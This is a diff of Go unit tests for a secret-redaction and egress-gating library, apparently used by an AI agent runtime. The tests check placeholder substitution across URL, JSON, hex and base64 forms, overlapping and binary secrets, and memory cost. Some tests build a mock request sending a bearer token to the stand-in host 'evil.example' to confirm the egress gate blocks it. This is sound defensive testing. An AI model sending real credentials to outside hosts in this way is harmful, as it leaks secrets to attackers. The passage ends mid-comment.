@@ -3,11 +3,16 @@ package secretguard
 import (
 	"encoding/base64"
 	"encoding/hex"
+	"encoding/json"
+	"fmt"
+	"math/rand"
 	"net/url"
 	"os"
 	"path/filepath"
+	"runtime"
 	"strings"
 	"testing"
+	"time"
 )
 
 const (
@@ -561,5 +566,661 @@ func TestRedact_HeuristicDisabled(t *testing.T) {
 	in := "leaked: " + awsKey
 	if got := g.Redact(in); !strings.Contains(got, awsKey) {
 		t.Errorf("heuristic disabled should leave unknown tokens: %q", got)
+	}
+}
+
+// Unmaterialize is Layer 1's mirror of Materialize: the sink kill switch
+// (RedactKnown and Heuristic off) turns Redact into a no-op and leaves it on.
+func TestUnmaterializeHoldsWithSinkRedactionOff(t *testing.T) {
+	const secret = "s3cr3t-VALUE-7f6e5d4c3b2a"
+	off := DefaultConfig()
+	off.RedactKnown, off.Heuristic = false, false
+	g := New([]Secret{{Name: "DEPLOY_TOKEN", Value: secret}}, off)
+	line := "./deploy.sh --token " + secret
+	if got := g.Redact(line); got != line {
+		t.Fatalf("Redact with the sink switch off = %q, want it untouched", got)
+	}
+	if got := g.Unmaterialize(line); got != "./deploy.sh --token __ITERION_SECRET_DEPLOY_TOKEN__" {
+		t.Fatalf("Unmaterialize = %q", got)
+	}
+	if got := g.Unmaterialize("ghp_R8tYq3ZkLm2NvB7xW4cD9fH1jP6sQ0aE5uTz"); got != "ghp_R8tYq3ZkLm2NvB7xW4cD9fH1jP6sQ0aE5uTz" {
+		t.Fatalf("Unmaterialize touched an unknown token shape: %q", got)
+	}
+}
+
+// A URL a JS runtime writes back (WebFetch reporting where it was redirected
+// from) percent-encodes a space but not "!", "(" or ")": that form is
+// registered too.
+func TestUnmaterializeRecognisesAURLAJSRuntimeWrote(t *testing.T) {
+	g := New([]Secret{{Name: "PW", Value: "correct horse battery staple!9f8e"}, {Name: "P2", Value: "a?b{c} d(e)"}}, DefaultConfig())
+	for in, want := range map[string]string{
+		"https://h/start?pw=correct%20horse%20battery%20staple!9f8e": "https://h/start?pw=__ITERION_SECRET_PW__",
+		"https://h/x?q=a?b{c}%20d(e)":                                "https://h/x?q=__ITERION_SECRET_P2__",
+		"https://h/a%3Fb%7Bc%7D%20d(e)/y":                            "https://h/__ITERION_SECRET_P2__/y",
+	} {
+		if got := g.Unmaterialize(in); got != want {
+			t.Fatalf("Unmaterialize(%q) = %q, want %q", in, got, want)
+		}
+	}
+}
+
+// LongestLiteral is the longest text the guard recognises as one value: an
+// encoding longer than the value itself counts (the hex form is twice as
+// long), and a guard with no known value — or none — recognises nothing.
+func TestLongestLiteralCoversEveryEncoding(t *testing.T) {
+	const value = "s3cr3t-VALUE-7f6e5d4c3b2a"
+	g := New([]Secret{{Name: "A", Value: value}, {Name: "B", Value: "short-but-ok"}}, DefaultConfig())
+	var longest int
+	for _, enc := range encodingsOf(value) {
+		longest = max(longest, len(enc))
+	}
+	if got := g.LongestLiteral(); got != longest || got < 2*len(value) {
+		t.Fatalf("LongestLiteral = %d, want %d (at least the hex form, %d)", got, longest, 2*len(value))
+	}
+	var none *Guard
+	if none.LongestLiteral() != 0 || New(nil, DefaultConfig()).LongestLiteral() != 0 {
+		t.Fatal("a guard with no known value recognises some text")
+	}
+}
+
+// A URL a JS runtime serialised (a fetched URL a tool reports) percent-encodes,
+// per the WHATWG URL standard and what Bun and Node do, C0 controls, DEL and
+// every byte of a non-ASCII character, plus the set of the component it sits
+// in — and leaves "!" raw, which no Go escaper does. Each such form of a known
+// value goes back to its placeholder. The expected forms are written by hand.
+func TestEveryWHATWGPercentEncodedFormIsRecognised(t *testing.T) {
+	for _, c := range []struct{ name, value, url, want string }{
+		{"non-ASCII in a query", "mötley crüe!9f8e", "https://h/?pw=m%C3%B6tley%20cr%C3%BCe!9f8e", "https://h/?pw=__ITERION_SECRET_S__"},
+		{"quote, angle brackets, apostrophe in a query", `a"b<c>d'e!f`, "https://h/?pw=a%22b%3Cc%3Ed%27e!f", "https://h/?pw=__ITERION_SECRET_S__"},
+		{"backtick, quote, angle brackets in a path", "a`b\"c<d>e!f", "https://h/a%60b%22c%3Cd%3Ee!f/x", "https://h/__ITERION_SECRET_S__/x"},
+		{"a caret in a path", "a^b|c[d]e-9f8e7d", "https://h/start/a%5Eb|c[d]e-9f8e7d/x", "https://h/start/__ITERION_SECRET_S__/x"},
+		{"a fragment", "it's a {secret}`x`", "https://h/start#pw=it's%20a%20{secret}%60x%60", "https://h/start#pw=__ITERION_SECRET_S__"},
+		{"userinfo", "p@ss:w0rd x&y", "https://app:p%40ss%3Aw0rd%20x&y@h/", "https://app:__ITERION_SECRET_S__@h/"},
+		{"encodeURIComponent", "a b!c&d=e", "https://h/?pw=a%20b!c%26d%3De", "https://h/?pw=__ITERION_SECRET_S__"},
+		{"a non-special URL's query", "it's #1 {a}!9f8e", "custom://h/?pw=it's%20%231%20{a}!9f8e", "custom://h/?pw=__ITERION_SECRET_S__"},
+		{"URLSearchParams", "Tr0ub4dor&3*horses~x", "https://h/?api_key=Tr0ub4dor%263*horses%7Ex", "https://h/?api_key=__ITERION_SECRET_S__"},
+		{"RFC 3986 strict (Python's quote)", "a b!c&d=e", "https://h/?pw=a%20b%21c%26d%3De", "https://h/?pw=__ITERION_SECRET_S__"},
+		{"Python's quote() default, which keeps /", "wJalr/K7MDENG+bPx=9f8e", "https://h/?k=wJalr/K7MDENG%2BbPx%3D9f8e", "https://h/?k=__ITERION_SECRET_S__"},
+		{"DEL in a query", "ab\x7fcd!ef", "https://h/?pw=ab%7Fcd!ef", "https://h/?pw=__ITERION_SECRET_S__"},
+		{"a C0 control in a query", "ab\x01cd!ef", "https://h/?pw=ab%01cd!ef", "https://h/?pw=__ITERION_SECRET_S__"},
+	} {
+		g := New([]Secret{{Name: "S", Value: c.value}}, DefaultConfig())
+		if got := g.Unmaterialize(c.url); got != c.want {
+			t.Errorf("%s: Unmaterialize(%q) = %q, want %q", c.name, c.url, got, c.want)
+		}
+	}
+}
+
+// A file's value ends with its newline; a tool printing it drops it (cat, the
+// CLI trimming a result): the value without it is recognised too.
+func TestAFileSecretIsRecognisedWithoutItsFinalNewline(t *testing.T) {
+	const value = "apiVersion: v1\nkind: Secret\npassword: correct horse battery staple!9f8e\n"
+	g := New([]Secret{{Name: "KUBE", Value: value}}, DefaultConfig())
+	printed := "$ cat kube.yaml\n" + strings.TrimRight(value, "\n")
+	if got := g.Unmaterialize(printed); strings.Contains(got, "correct horse") {
+		t.Fatalf("Unmaterialize(%q) = %q", printed, got)
+	}
+	if got := g.Materialize("__ITERION_SECRET_KUBE__"); got != value {
+		t.Fatalf("Materialize gives %q, want the value whole", got)
+	}
+	// The same output carried in a JSON string (a tool result in an event).
+	escaped, _ := json.Marshal(strings.TrimRight(value, "\n"))
+	inJSON := `{"output":` + string(escaped) + `}`
+	if got := g.Unmaterialize(inJSON); strings.Contains(got, "correct horse") {
+		t.Fatalf("Unmaterialize(%q) = %q", inJSON, got)
+	}
+}
+
+// A value without its final newline never takes another secret's literal: the
+// other secret's own value keeps its own placeholder.
+func TestATrimmedValueNeverTakesAnotherSecretsLiteral(t *testing.T) {
+	g := New([]Secret{{Name: "A", Value: "shared-value-1234\n"}, {Name: "B", Value: "shared-value-1234"}}, DefaultConfig())
+	if got := g.Unmaterialize("x shared-value-1234 y"); got != "x __ITERION_SECRET_B__ y" {
+		t.Fatalf("B's value unmaterialised as %q", got)
+	}
+	if got := g.Materialize("__ITERION_SECRET_B__"); got != "shared-value-1234" {
+		t.Fatalf("B's placeholder materialises as %q", got)
+	}
+	if got := g.Unmaterialize("shared-value-1234\n"); got != "__ITERION_SECRET_A__" {
+		t.Fatalf("A's value unmaterialised as %q", got)
+	}
+}
+
+// url.searchParams.set / URLSearchParams (WHATWG application/x-www-form-
+// urlencoded) — node 24 and bun write "p%7Ess*w0rd+%28x%29%219f8e" for the
+// value below; Go's QueryEscape writes "p~ss%2Aw0rd+...".
+func TestAURLSearchParamsFormIsRecognised(t *testing.T) {
+	const v = "p~ss*w0rd (x)!9f8e"
+	g := New([]Secret{{Name: "S", Value: v}}, DefaultConfig())
+	in := "https://h/?pw=p%7Ess*w0rd+%28x%29%219f8e"
+	if got := g.Unmaterialize(in); got == in {
+		t.Fatalf("Unmaterialize(%q) = %q: the URLSearchParams form of the secret is not recognised", in, got)
+	}
+}
+
+// the spec's own path set, which leaves ^ raw (Chrome, rust-url).
+func TestAPathFormThatLeavesTheCaretRawIsRecognised(t *testing.T) {
+	const v = "a^b{c}d?!9f8e7d"
+	g := New([]Secret{{Name: "S", Value: v}}, DefaultConfig())
+	in := "https://h/a^b%7Bc%7Dd%3F!9f8e7d/x"
+	if got, want := g.Unmaterialize(in), "https://h/__ITERION_SECRET_S__/x"; got != want {
+		t.Fatalf("Unmaterialize(%q) = %q, want %q", in, got, want)
+	}
+}
+
+// a value without its final newline must not steal another secret's exact
+// value: B's value maps to B's placeholder, and what it maps to materialises
+// back to that value.
+func TestATrimmedFileValueDoesNotStealAnotherSecretsValue(t *testing.T) {
+	const pw = "correct horse battery staple!9f8e"
+	g := New([]Secret{{Name: "A_FILE", Value: pw + "\n"}, {Name: "B_ENV", Value: pw}}, DefaultConfig())
+	out := g.Unmaterialize("login with " + pw + " now")
+	if !strings.Contains(out, "__ITERION_SECRET_B_ENV__") {
+		t.Errorf("B's own value redacts to %q, want B's placeholder", out)
+	}
+	if back := g.Materialize(out); back != "login with "+pw+" now" {
+		t.Errorf("round trip: Materialize(Unmaterialize(x)) = %q, want %q", back, "login with "+pw+" now")
+	}
+}
+
+// a CRLF file printed without its line ending.
+func TestACRLFFileSecretIsRecognisedWithoutItsLineEnding(t *testing.T) {
+	const value = "apiVersion: v1\r\nkind: Secret\r\npassword: correct horse battery staple!9f8e\r\n"
+	g := New([]Secret{{Name: "KUBE", Value: value}}, DefaultConfig())
+	printed := "$ cat kube.yaml\n" + strings.TrimRight(value, "\r\n")
+	if got := g.Unmaterialize(printed); strings.Contains(got, "correct horse") {
+		t.Fatalf("Unmaterialize(%q) = %q", printed, got)
+	}
+}
+
+// a value MinLen long only with its newline registers no shorter
+// literal.
+func TestATrimmedValueBelowMinLenIsNotRegistered(t *testing.T) {
+	g := New([]Secret{{Name: "S", Value: "abcd\n"}}, DefaultConfig())
+	if got := g.Unmaterialize("the abcd word"); got != "the abcd word" {
+		t.Fatalf("Unmaterialize = %q: a 4-byte literal was registered", got)
+	}
+}
+
+// a value longer than the bound whose redaction fits in it is
+// shown whole and not told cut.
+func TestARedactedValueThatFitsIsNotCut(t *testing.T) {
+	red := func(s string) string { return strings.ReplaceAll(s, "SECRET-VALUE-0123456789", "[R]") }
+	for _, s := range []string{"xx" + "SECRET-VALUE-0123456789", "xxxxxxx" + "SECRET-VALUE-0123456789"} {
+		head, cut := RedactHead(s, 10, 100, red)
+		if cut || head != red(s) {
+			t.Errorf("RedactHead(%q) = %q, cut=%v; want %q, cut=false", s, head, cut, red(s))
+		}
+	}
+}
+
+// Large file secrets — env-sized values ending with a newline, a multi-MiB
+// one — never make the guard panic (its panic text would be the secrets) and
+// stay recognised in their raw, trimmed, hex and base64 forms.
+func TestLargeFileSecretsNeverPanicAndStayRecognised(t *testing.T) {
+	file := func(tag string, n int) string {
+		var b strings.Builder
+		for i := 0; b.Len() < n; i++ {
+			fmt.Fprintf(&b, "- name: %s-%06d\n  token: %x\n", tag, i, i*7919)
+		}
+		return b.String()[:n-1] + "\n"
+	}
+	var secs []Secret
+	for i := range 6 {
+		secs = append(secs, Secret{Name: fmt.Sprintf("S%d", i), Value: file(fmt.Sprintf("deployer%d", i), 110<<10)})
+	}
+	secs = append(secs, Secret{Name: "BIG", Value: file("big", 3<<19)})
+	g := New(secs, DefaultConfig())
+	for _, s := range secs {
+		for form, text := range map[string]string{
+			"raw": s.Value, "trimmed": strings.TrimRight(s.Value, "\n"),
+			"hex": hex.EncodeToString([]byte(s.Value)), "base64": base64.StdEncoding.EncodeToString([]byte(s.Value)),
+		} {
+			if got := g.Unmaterialize("x " + text + " y"); got != "x __ITERION_SECRET_"+s.Name+"__ y" {
+				t.Errorf("%s %s: not mapped back (%d bytes)", s.Name, form, len(got))
+			}
+		}
+	}
+}
+
+// A value that is not valid UTF-8 never makes the guard panic, and is matched.
+func TestANonUTF8SecretNeverPanics(t *testing.T) {
+	const value = "tok-\xff\xfe-9f8e7d6c5b4a"
+	g := New([]Secret{{Name: "RAW", Value: value}}, DefaultConfig())
+	if got := g.Unmaterialize("x " + value + " y"); got != "x __ITERION_SECRET_RAW__ y" {
+		t.Fatalf("Unmaterialize = %q", got)
+	}
+}
+
+// A value in a JSON string as JSON.stringify or jq write it — no HTML escaping
+// of & < > — is recognised, the value without its final newline too.
+func TestAValueInAJSONStringWithoutHTMLEscapingIsRecognised(t *testing.T) {
+	const value = "p&ss\"w<rd>9f8e\n"
+	g := New([]Secret{{Name: "S", Value: value}}, DefaultConfig())
+	for _, body := range []string{`p&ss\"w<rd>9f8e\n`, `p&ss\"w<rd>9f8e`} {
+		in := `{"out":"` + body + `"}`
+		if got := g.Unmaterialize(in); got != `{"out":"__ITERION_SECRET_S__"}` {
+			t.Errorf("Unmaterialize(%q) = %q", in, got)
+		}
+	}
+}
+
+// rva10cFile builds a multi-line, newline-terminated file value of n bytes.
+func rva10cFile(tag string, n int) string {
+	var b strings.Builder
+	for i := 0; b.Len() < n; i++ {
+		fmt.Fprintf(&b, "- name: %s-%06d\n  token: %x\n", tag, i, i*7919)
+	}
+	return b.String()[:n-1] + "\n"
+}
+
+// Two secrets whose occurrences overlap in the text — one's tail is the
+// other's head — are both replaced: no part of either shows.
+func TestTwoSecretsOverlappingInTheTextAreBothReplaced(t *testing.T) {
+	g := New([]Secret{{Name: "A", Value: "abcd-efgh-ijkl-mnop"}, {Name: "B", Value: "wxyz-abcd-efgh"}}, DefaultConfig())
+	got := g.Unmaterialize("x wxyz-abcd-efgh-ijkl-mnop y")
+	for _, part := range []string{"wxyz", "abcd", "efgh", "ijkl", "mnop"} {
+		if strings.Contains(got, part) {
+			t.Fatalf("Unmaterialize = %q: %q of a secret shows", got, part)
+		}
+	}
+}
+
+// A host-scoped file secret ends with its newline; a tool that sends it
+// ($(cat file) strips it) toward another host exfiltrates it.
+func TestAFileSecretWithoutItsNewlineIsBlockedTowardAnotherHost(t *testing.T) {
+	const tok = "ghp_A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8"
+	g := New([]Secret{{Name: "GH_TOKEN", Value: tok + "\n", Hosts: []string{"github.com"}}}, DefaultConfig())
+	req := "GET /upload HTTP/1.1\r\nHost: evil.example\r\nAuthorization: Bearer " + tok + "\r\n\r\n"
+	if !g.ExfiltratesTo(req, "evil.example") {
+		t.Fatal("a host-scoped file secret sent without its final newline passed the egress gate")
+	}
+	if g.ExfiltratesTo(req, "api.github.com") {
+		t.Fatal("control: the secret's own host is blocked")
+	}
+}
+
+// The egress gate's fast path consults every part of the matcher: a large
+// file secret and a binary one, matched as plain strings, and a token in an
+// alternation.
+func TestTheEgressGateSeesEveryKindOfLiteral(t *testing.T) {
+	const tok = "sk-live-9f8e7d6c5b4a3210"
+	const bin = "\x30\x82\x01\xff\xfe-DER-KEY-MATERIAL-9f8e7d6c5b4a"
+	big := rva10cFile("big", 3<<19)
+	g := New([]Secret{
+		{Name: "BIG", Value: big, Hosts: []string{"vault.example.com"}},
+		{Name: "KEY", Value: bin, Hosts: []string{"vault.example.com"}},
+		{Name: "TOK", Value: tok, Hosts: []string{"api.example.com"}},
+	}, DefaultConfig())
+	if len(g.matcher.plain) == 0 || len(g.matcher.res) == 0 {
+		t.Fatalf("scenario broken: %d plain literal(s), %d alternation(s)", len(g.matcher.plain), len(g.matcher.res))
+	}
+	for name, body := range map[string]string{"the token": "Bearer " + tok, "the binary key": "body=" + bin, "the large file": "body=" + big[:len(big)-1]} {
+		if !g.ContainsSecret(body) || !g.ExfiltratesTo(body, "evil.example") {
+			t.Errorf("%s passed the egress gate", name)
+		}
+	}
+}
+
+// A binary file secret that embeds another registered secret is replaced
+// whole: the embedded one never breaks it apart.
+func TestABinaryFileEmbeddingAnotherSecretIsReplacedWhole(t *testing.T) {
+	const tok = "sk-live-9f8e7d6c5b4a3210"
+	bin := "\x00\xff\xfeKEYSTORE-HEADER-0001:" + tok + ":KEYSTORE-TRAILER-PRIVATE-MATERIAL\xfd\n"
+	g := New([]Secret{{Name: "STORE", Value: bin}, {Name: "TOK", Value: tok}}, DefaultConfig())
+	if got := g.Unmaterialize("x " + bin + " y"); got != "x __ITERION_SECRET_STORE__ y" {
+		t.Fatalf("Unmaterialize = %q: the binary file was broken apart by the secret it embeds", got)
+	}
+}
+
+// Two binary secrets, one inside the other (a DER chain and its leaf): the
+// longer is replaced whole.
+func TestTheLongerOfTwoBinarySecretsIsReplacedWhole(t *testing.T) {
+	leaf := "\x30\x82\x03\xff-LEAF-CERT-DER-0123456789abcdef"
+	chain := leaf + "\x30\x82\x04\xfe-INTERMEDIATE-CERT-DER-fedcba9876543210"
+	g := New([]Secret{{Name: "LEAF", Value: leaf}, {Name: "CHAIN", Value: chain}}, DefaultConfig())
+	if got := g.Unmaterialize("x " + chain + " y"); got != "x __ITERION_SECRET_CHAIN__ y" {
+		t.Fatalf("Unmaterialize = %q: the chain was broken apart by the leaf it holds", got)
+	}
+}
+
+// Of two secrets sharing a prefix, the longer is replaced whole where it
+// shows: the shorter never leaves its tail.
+func TestTheLongerOfTwoSecretsSharingAPrefixIsReplacedWhole(t *testing.T) {
+	g := New([]Secret{{Name: "SHORT", Value: "sk-live-9f8e7d6c"}, {Name: "LONG", Value: "sk-live-9f8e7d6c5b4a3210"}}, DefaultConfig())
+	if got := g.Unmaterialize("key=sk-live-9f8e7d6c5b4a3210;"); got != "key=__ITERION_SECRET_LONG__;" {
+		t.Fatalf("Unmaterialize = %q", got)
+	}
+	if got := g.Unmaterialize("key=sk-live-9f8e7d6c;"); got != "key=__ITERION_SECRET_SHORT__;" {
+		t.Fatalf("control: Unmaterialize = %q", got)
+	}
+}
+
+// A secret whose occurrences overlap one another in the text (a periodic
+// binary key) is replaced at each: no half of it shows.
+func TestASecretOverlappingItselfIsReplacedAtEachOccurrence(t *testing.T) {
+	const period = "\xff\xfeKEY-9f8e"
+	g := New([]Secret{{Name: "BIN", Value: period + period}}, DefaultConfig())
+	got := g.Unmaterialize("x " + period + period + period + " y")
+	if strings.Contains(got, "KEY-9f8e") {
+		t.Fatalf("Unmaterialize = %q: a part of the secret shows", got)
+	}
+}
+
+// The matcher of a large file secret costs about its forms, not tens of
+// bytes of regexp program per byte.
+func TestALargeFileSecretCostsAboutItsForms(t *testing.T) {
+	secret := rva10cFile("big", 1<<20)
+	runtime.GC()
+	var before, after runtime.MemStats
+	runtime.ReadMemStats(&before)
+	g := New([]Secret{{Name: "BIG", Value: secret}}, DefaultConfig())
+	runtime.GC()
+	runtime.ReadMemStats(&after)
+	retained := int64(after.HeapAlloc) - int64(before.HeapAlloc)
+	runtime.KeepAlive(g)
+	if retained > 64<<20 {
+		t.Fatalf("a 1 MiB file secret keeps %d MiB of heap", retained>>20)
+	}
+}
+
+// A value holding U+FFFD (a binary value that crossed a UTF-8 decoding
+// channel on its way in) is matched byte for byte: an invalid byte of the
+// text is not it, and never hides another secret inside a false match.
+func TestAValueHoldingTheReplacementCharacterMatchesOnlyItself(t *testing.T) {
+	const tok = "sk-live-9f8e7d6c5b4a3210"
+	store := "KEYSTORE-HDR�:" + tok + ":TRAILER"
+	g := New([]Secret{{Name: "STORE", Value: store}, {Name: "TOK", Value: tok}}, DefaultConfig())
+	if got := g.Unmaterialize("x KEYSTORE-HDR\xff:" + tok + ":TRAILER y"); strings.Contains(got, tok) {
+		t.Fatalf("Unmaterialize = %q: the token shows inside a false match", got)
+	}
+	if got := g.Unmaterialize("x " + store + " y"); got != "x __ITERION_SECRET_STORE__ y" {
+		t.Fatalf("control: Unmaterialize = %q", got)
+	}
+}
+
+// collapseSentinel turns every run of 0x01 into one.
+func collapseSentinel(s string) string {
+	var b strings.Builder
+	prev := false
+	for i := 0; i < len(s); i++ {
+		if s[i] == 0x01 {
+			if !prev {
+				b.WriteByte(0x01)
+			}
+			prev = true
+			continue
+		}
+		prev = false
+		b.WriteByte(s[i])
+	}
+	return b.String()
+}
+
+// The matcher covers exactly the union of every registered literal's
+// occurrences — periodic and overlapping ones, binary ones included: nothing
+// of one shows, nothing else is taken.
+func TestTheMatcherCoversExactlyTheUnionOfOccurrences(t *testing.T) {
+	rng := rand.New(rand.NewSource(11))
+	for iter := range 6000 {
+		alpha := []string{"ab", "abc", "a\xff", "\xfe\xffa"}[iter%4]
+		var secs []Secret
+		var pieces []string
+		for i := range 1 + rng.Intn(3) {
+			l := 5 + rng.Intn(8)
+			var b strings.Builder
+			if rng.Intn(3) == 0 {
+				per := 1 + rng.Intn(3)
+				unit := make([]byte, per)
+				for k := range unit {
+					unit[k] = alpha[rng.Intn(len(alpha))]
+				}
+				for b.Len() < l {
+					b.WriteByte(unit[b.Len()%per])
+				}
+			} else {
+				for b.Len() < l {
+					b.WriteByte(alpha[rng.Intn(len(alpha))])
+				}
+			}
+			secs = append(secs, Secret{Name: string(rune('A' + i)), Value: b.String()})
+			pieces = append(pieces, b.String())
+		}
+		g := New(secs, DefaultConfig())
+		var tb strings.Builder
+		for tb.Len() < 60+rng.Intn(80) {
+			switch rng.Intn(3) {
+			case 0:
+				p := pieces[rng.Intn(len(pieces))]
+				i := rng.Intn(len(p))
+				tb.WriteString(p[i : i+rng.Intn(len(p)-i)+1])
+			case 1:
+				tb.WriteString(pieces[rng.Intn(len(pieces))])
+			default:
+				tb.WriteByte(alpha[rng.Intn(len(alpha))])
+			}
+		}
+		text := tb.String()
+		covered := make([]bool, len(text))
+		for lit := range g.literalPlaceholder {
+			for off := 0; ; {
+				i := strings.Index(text[off:], lit)
+				if i < 0 {
+					break
+				}
+				for k := off + i; k < off+i+len(lit); k++ {
+					covered[k] = true
+				}
+				off += i + 1
+			}
+		}
+		var want strings.Builder
+		for k := range len(text) {
+			if covered[k] {
+				want.WriteByte(0x01)
+			} else {
+				want.WriteByte(text[k])
+			}
+		}
+		got := g.matcher.ReplaceAllStringFunc(text, func(m string) string {
+			if _, ok := g.literalPlaceholder[m]; !ok {
+				t.Fatalf("f called with %q, no registered literal", m)
+			}
+			return "\x01"
+		})
+		if collapseSentinel(got) != collapseSentinel(want.String()) {
+			t.Fatalf("secrets %q\ntext %q\n got %q\nwant %q", pieces, text, collapseSentinel(got), collapseSentinel(want.String()))
+		}
+	}
+}
+
+// A text made of whole occurrences of a secret, back to back, materialises
+// back to itself.
+func TestBackToBackOccurrencesRoundTrip(t *testing.T) {
+	for _, c := range []struct{ secret, text string }{
+		{"abcabc", "abcabcabcabc"},
+		{"xxxxxxxx", "xxxxxxxxxxxxxxxx"},
+		{"sk-9f8e7d6c", "sk-9f8e7d6csk-9f8e7d6c"},
+	} {
+		g := New([]Secret{{Name: "S", Value: c.secret}}, DefaultConfig())
+		if back := g.Materialize(g.Unmaterialize(c.text)); back != c.text {
+			t.Errorf("secret %q text %q: materialised back = %q", c.secret, c.text, back)
+		}
+	}
+}
+
+// A periodic secret over a long run of its period is replaced in one pass,
+// its output no longer than the text: before, each byte of the run restarted
+// the search (256 KiB took minutes) and each overlapping occurrence got a
+// placeholder.
+func TestAPeriodicSecretOverAPeriodicTextStaysLinear(t *testing.T) {
+	g := New([]Secret{{Name: "X", Value: strings.Repeat("x", 512)}}, DefaultConfig())
+	text := strings.Repeat("x", 256<<10)
+	start := time.Now()
+	out := g.Unmaterialize(text)
+	if el := time.Since(start); el > 5*time.Second || len(out) > len(text) || strings.Contains(out, "xxxxx") {
+		t.Fatalf("Unmaterialize took %s, %d bytes out of %d", el, len(out), len(text))
+	}
+}
+
+// A secret that ends another is covered by it: the longer is replaced once,
+// the shorter never appended after it — Materialize would then write the
+// longer value followed by the shorter.
+func TestASecretEndingAnotherIsReplacedOnce(t *testing.T) {
+	g := New([]Secret{{Name: "KEY", Value: "sk-live-9f8e7d6c5b4a3210"}, {Name: "TAIL", Value: "9f8e7d6c5b4a3210"}}, DefaultConfig())
+	un := g.Unmaterialize("key=sk-live-9f8e7d6c5b4a3210;")
+	if un != "key=__ITERION_SECRET_KEY__;" {
+		t.Fatalf("Unmaterialize = %q", un)
+	}
+	if back := g.Materialize(un); back != "key=sk-live-9f8e7d6c5b4a3210;" {
+		t.Fatalf("round trip = %q", back)
+	}
+}
+
+// A kubeconfig-sized file secret (20 KiB) costs about its forms too: a
+// literal of a few KiB is matched as a plain string, not compiled.
+func TestAKubeconfigSizedSecretCostsAboutItsForms(t *testing.T) {
+	secret := rva10cFile("kube", 20<<10)
+	runtime.GC()
+	var before, after runtime.MemStats
+	runtime.ReadMemStats(&before)
+	g := New([]Secret{{Name: "KUBECONFIG", Value: secret}}, DefaultConfig())
+	runtime.GC()
+	runtime.ReadMemStats(&after)
+	retained := int64(after.HeapAlloc) - int64(before.HeapAlloc)
+	runtime.KeepAlive(g)
+	if retained > 4<<20 {
+		t.Fatalf("a 20 KiB file secret keeps %d MiB of heap", retained>>20)
+	}
+}
+
+// The group's longest literal starts one byte before a run's end and runs
+// past it by one byte: the prefix check reaches it.
+func TestALongestLiteralStraddlingARunEndByOneByteIsReplaced(t *testing.T) {
+	g := New([]Secret{{Name: "A", Value: "34343"}, {Name: "B", Value: "44444445"}}, DefaultConfig())
+	if g.LongestLiteral() != 16 {
+		t.Fatalf("scenario broken: the longest literal is %d bytes, want hex(B)'s 16", g.LongestLiteral())
+	}
+	text := strings.Repeat("34", 10) + "35"
+	if got := g.Unmaterialize(text); strings.HasSuffix(got, "5") || !strings.HasSuffix(got, "__ITERION_SECRET_B__") {
+		t.Fatalf("Unmaterialize(%q) = %q: B's hex form straddling the run of A shows", text, got)
+	}
+}
+
+// A run that starts inside an earlier match counts its placeholders from
+// where that match ends: the text round-trips.
+func TestARunAfterAnOverlappingMatchRoundTrips(t *testing.T) {
+	g := New([]Secret{{Name: "P", Value: "abxxxxx"}, {Name: "Q", Value: "xxxxx"}}, DefaultConfig())
+	text := "ab" + strings.Repeat("x", 10)
+	if back := g.Materialize(g.Unmaterialize(text)); back != text {
+		t.Fatalf("Unmaterialize(%q) materialised back = %q", text, back)
+	}
+}
+
+// A partial overlap emits both placeholders: the second secret is never
+// dropped.
+func TestAPartialOverlapKeepsBothSecrets(t *testing.T) {
+	g := New([]Secret{{Name: "A", Value: "abcd-efgh-ijkl-mnop"}, {Name: "B", Value: "wxyz-abcd-efgh"}}, DefaultConfig())
+	if got := g.Unmaterialize("x wxyz-abcd-efgh-ijkl-mnop y"); got != "x __ITERION_SECRET_B____ITERION_SECRET_A__ y" {
+		t.Fatalf("Unmaterialize = %q", got)
+	}
+}
+
+// Each alternation group — a large secret set splits the literals into
+// several — searches on its own: a match of the second before the first
+// group's last one is replaced, and a run in the second checks the second
+// group's literals past its end.
+func TestEachLiteralGroupSearchesOnItsOwn(t *testing.T) {
+	const big = "tok-first-group-0123456789abcdef"
+	m := &literalMatcher{}
+	for _, lits := range [][]string{{big}, {"tok-short-9f8e7d6c", "3434343434343435", "34343"}} {
+		if err := m.addAlternation(lits); err != nil {
+			t.Fatal(err)
+		}
+	}
+	mark := func(lit string) string { return "<" + lit[:3] + ">" }
+	if got := m.ReplaceAllStringFunc("tok-short-9f8e7d6c "+big, mark); got != "<tok> <tok>" {
+		t.Fatalf("ReplaceAllStringFunc = %q: the second group's match before the first group's was skipped", got)
+	}
+	if got := m.ReplaceAllStringFunc(strings.Repeat("34", 10)+"35", mark); strings.HasSuffix(got, "5") {
+		t.Fatalf("ReplaceAllStringFunc = %q: a literal of the run's group past its end shows", got)
+	}
+}
+
+// The run group first: its run checks its own literals past the run's end,
+// not another group's.
+func TestTheFirstGroupsRunChecksItsOwnLiterals(t *testing.T) {
+	m := &literalMatcher{}
+	for _, lits := range [][]string{{"3434343434343435", "34343"}, {"tok-first-group-0123456789abcdef"}} {
+		if err := m.addAlternation(lits); err != nil {
+			t.Fatal(err)
+		}
+	}
+	mark := func(lit string) string { return "<" + lit[:3] + ">" }
+	if got := m.ReplaceAllStringFunc(strings.Repeat("34", 10)+"35", mark); strings.HasSuffix(got, "5") {
+		t.Fatalf("ReplaceAllStringFunc = %q: a literal of the first group's run past its end shows", got)
+	}
+}
+
+// The heuristic pass never redacts a placeholder: a secret's safe form, whose
+// reference whoever reads the text back needs (the assistant's chat history is
+// projected from scrubbed events). A value next to it is.
+func TestTheHeuristicNeverRedactsAPlaceholder(t *testing.T) {
+	g := New([]Secret{{Name: "OPENAI_KEY", Value: "sk-proj-abcdefghijklmnopqrstuvwx0123456789"}}, DefaultConfig())
+	for _, s := range []string{
+		"use api_key=__ITERION_SECRET_OPENAI_KEY__ for the call",
+		"password: __ITERION_SECRET_DB_PASSWORD__",
+		"secret=__ITERION_SECRET_DEPLOY_TOKEN__",
+		"Authorization: Bearer __ITERION_SECRET_GH_TOKEN_FOR_THE_DEPLOY_BOT__",
+	} {
+		if got := g.Redact(s); got != s {
+			t.Errorf("Redact(%q) = %q: the placeholder was redacted", s, got)
+		}
+	}
+	if got := g.Redact("password: hunter2-9f8e7d6c5b4a3210-FAKE"); !strings.Contains(got, "[redacted]") {
+		t.Fatalf("scenario broken: the heuristic spared an unknown password: %q", got)
+	}
+	// A span holding a placeholder and more is no placeholder.
+	if got := g.Redact("password: __ITERION_SECRET_DB_PASSWORD__hunter2-9f8e7d6c5b4a3210-FAKE"); strings.Contains(got, "hunter2") {
+		t.Errorf("a value glued to a placeholder was spared: %q", got)
+	}
+}
+
+// A placeholder of a lower-case secret name (the DSL's own examples:
